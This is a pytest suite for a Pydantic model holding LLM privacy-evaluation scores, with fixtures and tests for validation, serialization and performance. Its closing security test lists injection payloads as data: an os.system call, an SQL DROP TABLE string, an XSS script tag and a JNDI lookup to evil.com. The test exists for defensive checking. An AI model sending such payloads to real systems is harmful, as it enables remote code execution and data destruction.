"""
MIT License
https://mit-license.org/
Copyright © 2025 Infosys Ltd.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
"""

import pytest
import sys
import os
from typing import Dict, Any
from pydantic import ValidationError
import json

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
from dao.mappers.privacy import Privacy


# ==================== FIXTURES ====================

@pytest.fixture
def valid_privacy_data():
    """Fixture providing valid privacy data"""
    return {
        "model_name": "gpt-4",
        "privacy_awareness_normal": "0.85",
        "privacy_awareness_aug": "0.90",
        "privacy_leakage_rta": "0.88",
        "privacy_leakage_td": "0.92",
        "privacy_leakage_cd": "0.94",
        "privacy_awareness_correlation": "0.87",
        "overall": "0.894",
        "inhouse_model": False
    }


@pytest.fixture
def privacy_instance(valid_privacy_data):
    """Fixture providing a Privacy instance"""
    return Privacy(**valid_privacy_data)


@pytest.fixture
def minimal_privacy_data():
    """Fixture with minimal valid data"""
    return {
        "model_name": "test-model",
        "privacy_awareness_normal": "0.0",
        "privacy_awareness_aug": "0.0",
        "privacy_leakage_rta": "0.0",
        "privacy_leakage_td": "0.0",
        "privacy_leakage_cd": "0.0",
        "privacy_awareness_correlation": "0.0",
        "overall": "0.0"
    }


@pytest.fixture
def inhouse_model_data():
    """Fixture for inhouse model testing"""
    return {
        "model_name": "custom-inhouse-model",
        "privacy_awareness_normal": "0.95",
        "privacy_awareness_aug": "0.93",
        "privacy_leakage_rta": "0.91",
        "privacy_leakage_td": "0.96",
        "privacy_leakage_cd": "0.97",
        "privacy_awareness_correlation": "0.92",
        "overall": "0.943",
        "inhouse_model": True
    }


# ==================== FUNCTIONAL CORRECTNESS TESTS ====================

class TestPrivacyFunctionalCorrectness:
    """Test functional correctness of Privacy model"""
    
    def test_create_privacy_with_all_fields(self, valid_privacy_data):
        """Test creating Privacy instance with all fields"""
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.model_name == "gpt-4"
        assert privacy.privacy_awareness_normal == "0.85"
        assert privacy.privacy_awareness_aug == "0.90"
        assert privacy.privacy_leakage_rta == "0.88"
        assert privacy.privacy_leakage_td == "0.92"
        assert privacy.privacy_leakage_cd == "0.94"
        assert privacy.privacy_awareness_correlation == "0.87"
        assert privacy.overall == "0.894"
        assert privacy.inhouse_model is False
    
    def test_create_privacy_without_optional_inhouse_model(self, minimal_privacy_data):
        """Test creating Privacy instance without optional inhouse_model"""
        privacy = Privacy(**minimal_privacy_data)
        
        assert privacy.inhouse_model is False  # Default value
        assert privacy.model_name == "test-model"
    
    def test_all_score_fields_are_strings(self, valid_privacy_data):
        """Test that all score fields are stored as strings"""
        privacy = Privacy(**valid_privacy_data)
        
        assert isinstance(privacy.model_name, str)
        assert isinstance(privacy.privacy_awareness_normal, str)
        assert isinstance(privacy.privacy_awareness_aug, str)
        assert isinstance(privacy.privacy_leakage_rta, str)
        assert isinstance(privacy.privacy_leakage_td, str)
        assert isinstance(privacy.privacy_leakage_cd, str)
        assert isinstance(privacy.privacy_awareness_correlation, str)
        assert isinstance(privacy.overall, str)
    
    def test_inhouse_model_field_is_boolean(self, valid_privacy_data):
        """Test that inhouse_model is a boolean"""
        privacy = Privacy(**valid_privacy_data)
        
        assert isinstance(privacy.inhouse_model, bool)
    
    def test_inhouse_model_true(self, inhouse_model_data):
        """Test setting inhouse_model to True"""
        privacy = Privacy(**inhouse_model_data)
        
        assert privacy.inhouse_model is True
        assert privacy.model_name == "custom-inhouse-model"
    
    def test_inhouse_model_false(self, valid_privacy_data):
        """Test setting inhouse_model to False"""
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.inhouse_model is False
    
    def test_inhouse_model_default_value(self, minimal_privacy_data):
        """Test that inhouse_model has default value of False"""
        privacy = Privacy(**minimal_privacy_data)
        
        assert privacy.inhouse_model is False
    
    def test_model_name_field_variations(self, valid_privacy_data):
        """Test various model_name values"""
        model_names = [
            "gpt-4",
            "claude-3-opus",
            "llama-2-70b",
            "custom_model_v1",
            "Model-2024",
            "AI-Privacy-Model"
        ]
        
        for model_name in model_names:
            valid_privacy_data["model_name"] = model_name
            privacy = Privacy(**valid_privacy_data)
            assert privacy.model_name == model_name
    
    def test_privacy_awareness_normal_field(self, valid_privacy_data):
        """Test privacy_awareness_normal field"""
        test_values = ["0.0", "0.5", "0.999", "1.0"]
        
        for value in test_values:
            valid_privacy_data["privacy_awareness_normal"] = value
            privacy = Privacy(**valid_privacy_data)
            assert privacy.privacy_awareness_normal == value
    
    def test_privacy_awareness_aug_field(self, valid_privacy_data):
        """Test privacy_awareness_aug field"""
        test_values = ["0.1", "0.45", "0.89", "1.0"]
        
        for value in test_values:
            valid_privacy_data["privacy_awareness_aug"] = value
            privacy = Privacy(**valid_privacy_data)
            assert privacy.privacy_awareness_aug == value
    
    def test_privacy_leakage_rta_field(self, valid_privacy_data):
        """Test privacy_leakage_rta field"""
        test_values = ["0.2", "0.55", "0.88"]
        
        for value in test_values:
            valid_privacy_data["privacy_leakage_rta"] = value
            privacy = Privacy(**valid_privacy_data)
            assert privacy.privacy_leakage_rta == value
    
    def test_privacy_leakage_td_field(self, valid_privacy_data):
        """Test privacy_leakage_td field"""
        test_values = ["0.0", "0.33", "0.67", "1.0"]
        
        for value in test_values:
            valid_privacy_data["privacy_leakage_td"] = value
            privacy = Privacy(**valid_privacy_data)
            assert privacy.privacy_leakage_td == value
    
    def test_privacy_leakage_cd_field(self, valid_privacy_data):
        """Test privacy_leakage_cd field"""
        test_values = ["0.15", "0.5", "0.95"]
        
        for value in test_values:
            valid_privacy_data["privacy_leakage_cd"] = value
            privacy = Privacy(**valid_privacy_data)
            assert privacy.privacy_leakage_cd == value
    
    def test_privacy_awareness_correlation_field(self, valid_privacy_data):
        """Test privacy_awareness_correlation field"""
        test_values = ["0.0", "0.4", "0.8", "1.0"]
        
        for value in test_values:
            valid_privacy_data["privacy_awareness_correlation"] = value
            privacy = Privacy(**valid_privacy_data)
            assert privacy.privacy_awareness_correlation == value
    
    def test_overall_field(self, valid_privacy_data):
        """Test overall field"""
        test_values = ["0.0", "0.123", "0.888", "1.0"]
        
        for value in test_values:
            valid_privacy_data["overall"] = value
            privacy = Privacy(**valid_privacy_data)
            assert privacy.overall == value


# ==================== EDGE CASES TESTS ====================

class TestPrivacyEdgeCases:
    """Test edge cases for Privacy model"""
    
    def test_empty_string_score_values(self, valid_privacy_data):
        """Test that empty strings are accepted for score fields"""
        valid_privacy_data["privacy_awareness_normal"] = ""
        valid_privacy_data["overall"] = ""
        
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.privacy_awareness_normal == ""
        assert privacy.overall == ""
    
    def test_very_long_string_values(self, valid_privacy_data):
        """Test handling of very long string values"""
        long_value = "0." + "1234567890" * 100
        valid_privacy_data["overall"] = long_value
        
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.overall == long_value
        assert len(privacy.overall) > 1000
    
    def test_special_characters_in_score_fields(self, valid_privacy_data):
        """Test special characters in score fields"""
        special_values = [
            "0.85%",
            "N/A",
            "null",
            "-0.5",
            "+0.95",
            "0,85"
        ]
        
        for value in special_values:
            valid_privacy_data["privacy_awareness_normal"] = value
            privacy = Privacy(**valid_privacy_data)
            assert privacy.privacy_awareness_normal == value
    
    def test_whitespace_in_strings(self, valid_privacy_data):
        """Test handling of whitespace in string fields"""
        valid_privacy_data["model_name"] = "  model with spaces  "
        valid_privacy_data["overall"] = " 0.85 "
        
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.model_name == "  model with spaces  "
        assert privacy.overall == " 0.85 "
    
    def test_zero_values(self, valid_privacy_data):
        """Test zero values for score fields"""
        valid_privacy_data["privacy_awareness_normal"] = "0"
        valid_privacy_data["privacy_leakage_rta"] = "0.0"
        valid_privacy_data["overall"] = "0.00"
        
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.privacy_awareness_normal == "0"
        assert privacy.privacy_leakage_rta == "0.0"
        assert privacy.overall == "0.00"
    
    def test_very_large_score_values(self, valid_privacy_data):
        """Test very large numeric string values"""
        valid_privacy_data["overall"] = "999999.999999"
        
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.overall == "999999.999999"
    
    def test_negative_score_values(self, valid_privacy_data):
        """Test negative score values"""
        valid_privacy_data["privacy_awareness_normal"] = "-0.5"
        valid_privacy_data["overall"] = "-100"
        
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.privacy_awareness_normal == "-0.5"
        assert privacy.overall == "-100"
    
    def test_unicode_characters_in_model_name(self, valid_privacy_data):
        """Test unicode characters in model_name"""
        unicode_names = [
            "模型-GPT-4",
            "Модель-Privacy",
            "モデル-AI",
            "🤖-Privacy-Model",
            "Model™®©"
        ]
        
        for name in unicode_names:
            valid_privacy_data["model_name"] = name
            privacy = Privacy(**valid_privacy_data)
            assert privacy.model_name == name
    
    def test_single_character_model_name(self, valid_privacy_data):
        """Test single character model name"""
        valid_privacy_data["model_name"] = "A"
        
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.model_name == "A"
    
    def test_very_long_model_name(self, valid_privacy_data):
        """Test very long model name"""
        long_name = "model_" * 1000
        valid_privacy_data["model_name"] = long_name
        
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.model_name == long_name
        assert len(privacy.model_name) >= 6000
    
    def test_numeric_string_formats(self, valid_privacy_data):
        """Test various numeric string formats"""
        formats = [
            "0.5",
            ".5",
            "0.500",
            "0.5000000",
            "5e-1",
            "5E-1"
        ]
        
        for fmt in formats:
            valid_privacy_data["privacy_awareness_normal"] = fmt
            privacy = Privacy(**valid_privacy_data)
            assert privacy.privacy_awareness_normal == fmt


# ==================== ERROR HANDLING & VALIDATION TESTS ====================

class TestPrivacyErrorHandling:
    """Test error handling and validation"""
    
    def test_missing_required_model_name(self, valid_privacy_data):
        """Test that missing model_name raises ValidationError"""
        del valid_privacy_data["model_name"]
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert "model_name" in str(exc_info.value)
        assert "Field required" in str(exc_info.value)
    
    def test_missing_required_privacy_awareness_normal(self, valid_privacy_data):
        """Test that missing privacy_awareness_normal raises ValidationError"""
        del valid_privacy_data["privacy_awareness_normal"]
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert "privacy_awareness_normal" in str(exc_info.value)
    
    def test_missing_required_privacy_awareness_aug(self, valid_privacy_data):
        """Test that missing privacy_awareness_aug raises ValidationError"""
        del valid_privacy_data["privacy_awareness_aug"]
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert "privacy_awareness_aug" in str(exc_info.value)
    
    def test_missing_required_privacy_leakage_rta(self, valid_privacy_data):
        """Test that missing privacy_leakage_rta raises ValidationError"""
        del valid_privacy_data["privacy_leakage_rta"]
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert "privacy_leakage_rta" in str(exc_info.value)
    
    def test_missing_required_privacy_leakage_td(self, valid_privacy_data):
        """Test that missing privacy_leakage_td raises ValidationError"""
        del valid_privacy_data["privacy_leakage_td"]
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert "privacy_leakage_td" in str(exc_info.value)
    
    def test_missing_required_privacy_leakage_cd(self, valid_privacy_data):
        """Test that missing privacy_leakage_cd raises ValidationError"""
        del valid_privacy_data["privacy_leakage_cd"]
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert "privacy_leakage_cd" in str(exc_info.value)
    
    def test_missing_required_privacy_awareness_correlation(self, valid_privacy_data):
        """Test that missing privacy_awareness_correlation raises ValidationError"""
        del valid_privacy_data["privacy_awareness_correlation"]
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert "privacy_awareness_correlation" in str(exc_info.value)
    
    def test_missing_required_overall(self, valid_privacy_data):
        """Test that missing overall raises ValidationError"""
        del valid_privacy_data["overall"]
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert "overall" in str(exc_info.value)
    
    def test_missing_optional_inhouse_model(self, valid_privacy_data):
        """Test that missing inhouse_model uses default value"""
        del valid_privacy_data["inhouse_model"]
        
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.inhouse_model is False
    
    def test_none_value_for_required_field(self, valid_privacy_data):
        """Test that None value for required field raises ValidationError"""
        valid_privacy_data["model_name"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert "model_name" in str(exc_info.value)
    
    def test_none_value_for_score_field(self, valid_privacy_data):
        """Test that None value for score field raises ValidationError"""
        valid_privacy_data["privacy_awareness_normal"] = None
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert "privacy_awareness_normal" in str(exc_info.value)
    
    def test_none_value_for_optional_inhouse_model(self, valid_privacy_data):
        """Test that None value for optional inhouse_model is accepted"""
        valid_privacy_data["inhouse_model"] = None
        
        # Since inhouse_model is Optional[bool], None should be accepted
        privacy = Privacy(**valid_privacy_data)
        
        # None should be preserved
        assert privacy.inhouse_model is None
    
    def test_invalid_type_for_inhouse_model(self, valid_privacy_data):
        """Test that invalid type for inhouse_model raises ValidationError"""
        valid_privacy_data["inhouse_model"] = "not_a_boolean"
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert "inhouse_model" in str(exc_info.value)
        assert "bool_parsing" in str(exc_info.value)
    
    def test_numeric_inhouse_model_values(self, valid_privacy_data):
        """Test numeric values for inhouse_model field"""
        valid_privacy_data["inhouse_model"] = 0
        privacy1 = Privacy(**valid_privacy_data)
        assert privacy1.inhouse_model is False
        
        valid_privacy_data["inhouse_model"] = 1
        privacy2 = Privacy(**valid_privacy_data)
        assert privacy2.inhouse_model is True
    
    def test_empty_dict_initialization(self):
        """Test that empty dict raises ValidationError"""
        with pytest.raises(ValidationError) as exc_info:
            Privacy()
        
        errors = str(exc_info.value)
        assert "model_name" in errors
        assert "privacy_awareness_normal" in errors
        assert "overall" in errors
    
    def test_extra_fields_handling(self, valid_privacy_data):
        """Test handling of extra fields not in model"""
        valid_privacy_data["extra_field"] = "extra_value"
        valid_privacy_data["another_field"] = 123
        
        # By default, Pydantic ignores extra fields
        privacy = Privacy(**valid_privacy_data)
        
        assert not hasattr(privacy, "extra_field")
        assert not hasattr(privacy, "another_field")
    
    def test_multiple_missing_fields(self):
        """Test that multiple missing fields are reported"""
        incomplete_data = {
            "model_name": "test-model"
            # All other required fields missing
        }
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**incomplete_data)
        
        error_str = str(exc_info.value)
        assert "privacy_awareness_normal" in error_str
        assert "overall" in error_str


# ==================== SERIALIZATION & DESERIALIZATION TESTS ====================

class TestPrivacySerialization:
    """Test serialization and deserialization"""
    
    def test_model_dump(self, privacy_instance):
        """Test converting Privacy instance to dictionary"""
        data = privacy_instance.model_dump()
        
        assert isinstance(data, dict)
        assert data["model_name"] == "gpt-4"
        assert data["privacy_awareness_normal"] == "0.85"
        assert data["inhouse_model"] is False
        assert len(data) == 9  # All 9 fields
    
    def test_model_dump_json(self, privacy_instance):
        """Test converting Privacy instance to JSON string"""
        json_str = privacy_instance.model_dump_json()
        
        assert isinstance(json_str, str)
        assert "gpt-4" in json_str
        assert "0.85" in json_str
        
        # Verify it's valid JSON
        parsed = json.loads(json_str)
        assert parsed["model_name"] == "gpt-4"
    
    def test_model_dump_exclude_fields(self, privacy_instance):
        """Test excluding fields during serialization"""
        data = privacy_instance.model_dump(exclude={"inhouse_model", "overall"})
        
        assert "model_name" in data
        assert "privacy_awareness_normal" in data
        assert "inhouse_model" not in data
        assert "overall" not in data
    
    def test_model_dump_include_fields(self, privacy_instance):
        """Test including only specific fields during serialization"""
        data = privacy_instance.model_dump(include={"model_name", "overall", "inhouse_model"})
        
        assert "model_name" in data
        assert "overall" in data
        assert "inhouse_model" in data
        assert "privacy_awareness_normal" not in data
    
    def test_json_deserialization(self, valid_privacy_data):
        """Test creating Privacy from JSON string"""
        json_str = json.dumps(valid_privacy_data)
        privacy = Privacy.model_validate_json(json_str)
        
        assert privacy.model_name == valid_privacy_data["model_name"]
        assert privacy.overall == valid_privacy_data["overall"]
    
    def test_dict_deserialization(self, valid_privacy_data):
        """Test creating Privacy from dictionary"""
        privacy = Privacy.model_validate(valid_privacy_data)
        
        assert privacy.model_name == valid_privacy_data["model_name"]
        assert privacy.privacy_awareness_normal == valid_privacy_data["privacy_awareness_normal"]
    
    def test_roundtrip_serialization(self, privacy_instance):
        """Test that serialization and deserialization preserve data"""
        # Serialize to dict
        data = privacy_instance.model_dump()
        
        # Deserialize back
        privacy_copy = Privacy(**data)
        
        # Compare all fields
        assert privacy_copy.model_name == privacy_instance.model_name
        assert privacy_copy.privacy_awareness_normal == privacy_instance.privacy_awareness_normal
        assert privacy_copy.privacy_awareness_aug == privacy_instance.privacy_awareness_aug
        assert privacy_copy.privacy_leakage_rta == privacy_instance.privacy_leakage_rta
        assert privacy_copy.privacy_leakage_td == privacy_instance.privacy_leakage_td
        assert privacy_copy.privacy_leakage_cd == privacy_instance.privacy_leakage_cd
        assert privacy_copy.privacy_awareness_correlation == privacy_instance.privacy_awareness_correlation
        assert privacy_copy.overall == privacy_instance.overall
        assert privacy_copy.inhouse_model == privacy_instance.inhouse_model
    
    def test_json_roundtrip(self, privacy_instance):
        """Test JSON serialization and deserialization roundtrip"""
        json_str = privacy_instance.model_dump_json()
        privacy_copy = Privacy.model_validate_json(json_str)
        
        assert privacy_copy.model_name == privacy_instance.model_name
        assert privacy_copy.overall == privacy_instance.overall
        assert privacy_copy.inhouse_model == privacy_instance.inhouse_model


# ==================== EQUALITY & COMPARISON TESTS ====================

class TestPrivacyEquality:
    """Test equality and comparison operations"""
    
    def test_equality_same_values(self, valid_privacy_data):
        """Test that two Privacy instances with same values are equal"""
        privacy1 = Privacy(**valid_privacy_data)
        privacy2 = Privacy(**valid_privacy_data)
        
        assert privacy1 == privacy2
    
    def test_inequality_different_model_name(self, valid_privacy_data):
        """Test that Privacy instances with different model_name are not equal"""
        privacy1 = Privacy(**valid_privacy_data)
        
        valid_privacy_data["model_name"] = "different-model"
        privacy2 = Privacy(**valid_privacy_data)
        
        assert privacy1 != privacy2
    
    def test_inequality_different_score(self, valid_privacy_data):
        """Test that Privacy instances with different score are not equal"""
        privacy1 = Privacy(**valid_privacy_data)
        
        valid_privacy_data["overall"] = "0.99"
        privacy2 = Privacy(**valid_privacy_data)
        
        assert privacy1 != privacy2
    
    def test_inequality_different_inhouse_model(self, valid_privacy_data):
        """Test that Privacy instances with different inhouse_model are not equal"""
        valid_privacy_data["inhouse_model"] = False
        privacy1 = Privacy(**valid_privacy_data)
        
        valid_privacy_data["inhouse_model"] = True
        privacy2 = Privacy(**valid_privacy_data)
        
        assert privacy1 != privacy2


# ==================== IMMUTABILITY & STATE TESTS ====================

class TestPrivacyImmutability:
    """Test immutability and state management"""
    
    def test_field_modification(self, privacy_instance):
        """Test that fields can be modified"""
        original_name = privacy_instance.model_name
        privacy_instance.model_name = "new-model"
        
        assert privacy_instance.model_name == "new-model"
        assert privacy_instance.model_name != original_name
    
    def test_score_field_reassignment(self, privacy_instance):
        """Test that score fields can be reassigned"""
        privacy_instance.overall = "0.95"
        
        assert isinstance(privacy_instance.overall, str)
        assert privacy_instance.overall == "0.95"
    
    def test_inhouse_model_toggle(self, privacy_instance):
        """Test toggling inhouse_model field"""
        original_value = privacy_instance.inhouse_model
        privacy_instance.inhouse_model = not original_value
        
        assert privacy_instance.inhouse_model != original_value
    
    def test_multiple_field_modifications(self, privacy_instance):
        """Test modifying multiple fields"""
        privacy_instance.privacy_awareness_normal = "0.99"
        privacy_instance.privacy_leakage_td = "0.98"
        privacy_instance.overall = "0.985"
        
        assert privacy_instance.privacy_awareness_normal == "0.99"
        assert privacy_instance.privacy_leakage_td == "0.98"
        assert privacy_instance.overall == "0.985"


# ==================== PERFORMANCE TESTS ====================

class TestPrivacyPerformance:
    """Test performance characteristics"""
    
    def test_instantiation_performance(self, valid_privacy_data):
        """Test that Privacy instantiation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Privacy(**valid_privacy_data)
        end_time = time.time()
        
        # 1000 instantiations should complete quickly
        assert (end_time - start_time) < 1.0
    
    def test_serialization_performance(self, privacy_instance):
        """Test that serialization is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            privacy_instance.model_dump()
        end_time = time.time()
        
        # 1000 serializations should complete quickly
        assert (end_time - start_time) < 0.5
    
    def test_validation_performance(self, valid_privacy_data):
        """Test that validation is fast"""
        import time
        
        start_time = time.time()
        for _ in range(1000):
            Privacy.model_validate(valid_privacy_data)
        end_time = time.time()
        
        # 1000 validations should complete quickly
        assert (end_time - start_time) < 1.0


# ==================== CODE QUALITY & STRUCTURE TESTS ====================

class TestPrivacyCodeQuality:
    """Test code quality and structure"""
    
    def test_privacy_is_pydantic_basemodel(self):
        """Test that Privacy inherits from BaseModel"""
        from pydantic import BaseModel
        assert issubclass(Privacy, BaseModel)
    
    def test_all_required_fields_present(self):
        """Test that all expected fields are defined"""
        fields = Privacy.model_fields
        
        assert "model_name" in fields
        assert "privacy_awareness_normal" in fields
        assert "privacy_awareness_aug" in fields
        assert "privacy_leakage_rta" in fields
        assert "privacy_leakage_td" in fields
        assert "privacy_leakage_cd" in fields
        assert "privacy_awareness_correlation" in fields
        assert "overall" in fields
        assert "inhouse_model" in fields
    
    def test_field_count(self):
        """Test that model has exactly 9 fields"""
        fields = Privacy.model_fields
        assert len(fields) == 9
    
    def test_field_types(self):
        """Test that fields have correct type annotations"""
        from typing import get_origin, get_args
        fields = Privacy.model_fields
        
        # String fields
        assert fields["model_name"].annotation == str
        assert fields["privacy_awareness_normal"].annotation == str
        assert fields["privacy_awareness_aug"].annotation == str
        assert fields["privacy_leakage_rta"].annotation == str
        assert fields["privacy_leakage_td"].annotation == str
        assert fields["privacy_leakage_cd"].annotation == str
        assert fields["privacy_awareness_correlation"].annotation == str
        assert fields["overall"].annotation == str
        
        # Optional bool field - check it's Optional[bool]
        inhouse_annotation = fields["inhouse_model"].annotation
        # In Python 3.10+, Optional[bool] is Union[bool, None]
        assert get_origin(inhouse_annotation) is type(None) or str(inhouse_annotation) == "Optional[bool]" or "bool" in str(inhouse_annotation)
    
    def test_inhouse_model_has_default(self):
        """Test that inhouse_model has default value"""
        fields = Privacy.model_fields
        
        assert not fields["inhouse_model"].is_required()
        assert fields["inhouse_model"].default == False
    
    def test_required_fields_no_default(self):
        """Test that required fields have no default value"""
        fields = Privacy.model_fields
        
        required_fields = [
            "model_name", "privacy_awareness_normal", "privacy_awareness_aug",
            "privacy_leakage_rta", "privacy_leakage_td", "privacy_leakage_cd",
            "privacy_awareness_correlation", "overall"
        ]
        
        for field_name in required_fields:
            assert fields[field_name].is_required(), f"Field {field_name} should be required"
    
    def test_privacy_has_string_representation(self, privacy_instance):
        """Test that Privacy instance has string representation"""
        str_repr = str(privacy_instance)
        
        assert isinstance(str_repr, str)
        assert len(str_repr) > 0
    
    def test_privacy_has_repr(self, privacy_instance):
        """Test that Privacy instance has repr"""
        repr_str = repr(privacy_instance)
        
        assert isinstance(repr_str, str)
        assert "Privacy" in repr_str


# ==================== PARAMETRIZED TESTS ====================

class TestPrivacyParametrized:
    """Parametrized tests for comprehensive coverage"""
    
    @pytest.mark.parametrize("field_name,field_value", [
        ("privacy_awareness_normal", "0.1"),
        ("privacy_awareness_normal", "0.999999"),
        ("privacy_awareness_aug", "0.0"),
        ("privacy_awareness_aug", "1.0"),
        ("privacy_leakage_rta", "0.5"),
        ("privacy_leakage_td", "0.75"),
        ("privacy_leakage_cd", "0.25"),
        ("privacy_awareness_correlation", "0.888"),
        ("overall", "0.5"),
    ])
    def test_various_score_values(self, valid_privacy_data, field_name, field_value):
        """Test various score values for different fields"""
        valid_privacy_data[field_name] = field_value
        privacy = Privacy(**valid_privacy_data)
        
        assert getattr(privacy, field_name) == field_value
    
    @pytest.mark.parametrize("model_name", [
        "gpt-3.5-turbo",
        "gpt-4",
        "claude-2",
        "claude-3-opus",
        "llama-2-7b",
        "llama-2-70b",
        "mistral-7b",
        "gemini-pro",
        "custom-privacy-model",
        "inhouse-model-v2",
    ])
    def test_various_model_names(self, valid_privacy_data, model_name):
        """Test various common model names"""
        valid_privacy_data["model_name"] = model_name
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.model_name == model_name
    
    @pytest.mark.parametrize("inhouse_value,expected", [
        (True, True),
        (False, False),
        (1, True),
        (0, False),
        ("true", True),
        ("false", False),
    ])
    def test_various_inhouse_model_values(self, valid_privacy_data, inhouse_value, expected):
        """Test various inhouse_model values and their coercion"""
        valid_privacy_data["inhouse_model"] = inhouse_value
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.inhouse_model == expected
    
    @pytest.mark.parametrize("missing_field", [
        "model_name",
        "privacy_awareness_normal",
        "privacy_awareness_aug",
        "privacy_leakage_rta",
        "privacy_leakage_td",
        "privacy_leakage_cd",
        "privacy_awareness_correlation",
        "overall",
    ])
    def test_missing_required_fields(self, valid_privacy_data, missing_field):
        """Test that missing any required field raises ValidationError"""
        del valid_privacy_data[missing_field]
        
        with pytest.raises(ValidationError) as exc_info:
            Privacy(**valid_privacy_data)
        
        assert missing_field in str(exc_info.value)


# ==================== INTEGRATION TESTS ====================

class TestPrivacyIntegration:
    """Test integration with external systems"""
    
    def test_json_compatibility(self, privacy_instance):
        """Test that Privacy can be serialized to standard JSON"""
        json_str = privacy_instance.model_dump_json()
        
        # Should be parseable by standard json module
        data = json.loads(json_str)
        assert isinstance(data, dict)
        assert data["model_name"] == privacy_instance.model_name
    
    def test_dict_compatibility(self, privacy_instance):
        """Test that Privacy works with dict operations"""
        data = privacy_instance.model_dump()
        
        # Should support dict operations
        assert "model_name" in data
        assert list(data.keys())
        assert list(data.values())
    
    def test_database_ready_format(self, privacy_instance):
        """Test that Privacy output is ready for database storage"""
        data = privacy_instance.model_dump()
        
        # All values should be JSON-serializable types
        json_str = json.dumps(data)
        assert isinstance(json_str, str)
        
        # Should be able to parse back
        parsed = json.loads(json_str)
        assert parsed == data
    
    def test_batch_processing_simulation(self, valid_privacy_data):
        """Test creating multiple Privacy instances for batch processing"""
        instances = []
        
        for i in range(10):
            data = valid_privacy_data.copy()
            data["model_name"] = f"model-{i}"
            data["overall"] = f"0.{i}{i}"
            instances.append(Privacy(**data))
        
        assert len(instances) == 10
        assert instances[0].model_name == "model-0"
        assert instances[9].model_name == "model-9"


# ==================== REGRESSION TESTS ====================

class TestPrivacyRegression:
    """Test for regression and backward compatibility"""
    
    def test_backwards_compatible_with_old_data(self):
        """Test that model works with legacy data format"""
        legacy_data = {
            "model_name": "legacy-model",
            "privacy_awareness_normal": "0.8",
            "privacy_awareness_aug": "0.85",
            "privacy_leakage_rta": "0.82",
            "privacy_leakage_td": "0.88",
            "privacy_leakage_cd": "0.90",
            "privacy_awareness_correlation": "0.83",
            "overall": "0.852",
            "inhouse_model": False
        }
        
        privacy = Privacy(**legacy_data)
        
        assert privacy.model_name == "legacy-model"
        assert privacy.inhouse_model is False
    
    def test_backwards_compatible_without_inhouse_model(self):
        """Test that model works without inhouse_model field (uses default)"""
        legacy_data = {
            "model_name": "legacy-model",
            "privacy_awareness_normal": "0.8",
            "privacy_awareness_aug": "0.85",
            "privacy_leakage_rta": "0.82",
            "privacy_leakage_td": "0.88",
            "privacy_leakage_cd": "0.90",
            "privacy_awareness_correlation": "0.83",
            "overall": "0.852"
        }
        
        privacy = Privacy(**legacy_data)
        
        assert privacy.model_name == "legacy-model"
        assert privacy.inhouse_model is False  # Default value
    
    def test_all_fields_have_correct_types(self, valid_privacy_data):
        """Regression test to ensure field types are correct"""
        privacy = Privacy(**valid_privacy_data)
        
        # Verify string fields
        for field_name in ["model_name", "privacy_awareness_normal", "privacy_awareness_aug",
                          "privacy_leakage_rta", "privacy_leakage_td", "privacy_leakage_cd",
                          "privacy_awareness_correlation", "overall"]:
            value = getattr(privacy, field_name)
            assert isinstance(value, str), f"Field {field_name} should be string, got {type(value)}"
        
        # Verify boolean field
        assert isinstance(privacy.inhouse_model, bool)


# ==================== SECURITY TESTS ====================

class TestPrivacySecurity:
    """Test security aspects"""
    
    def test_no_code_injection_in_model_name(self, valid_privacy_data):
        """Test that model_name with code-like strings is treated as string"""
        malicious_names = [
            "__import__('os').system('ls')",
            "'; DROP TABLE privacy; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
        ]
        
        for name in malicious_names:
            valid_privacy_data["model_name"] = name
            privacy = Privacy(**valid_privacy_data)
            # Should just store as string, not execute
            assert privacy.model_name == name
            assert isinstance(privacy.model_name, str)
    
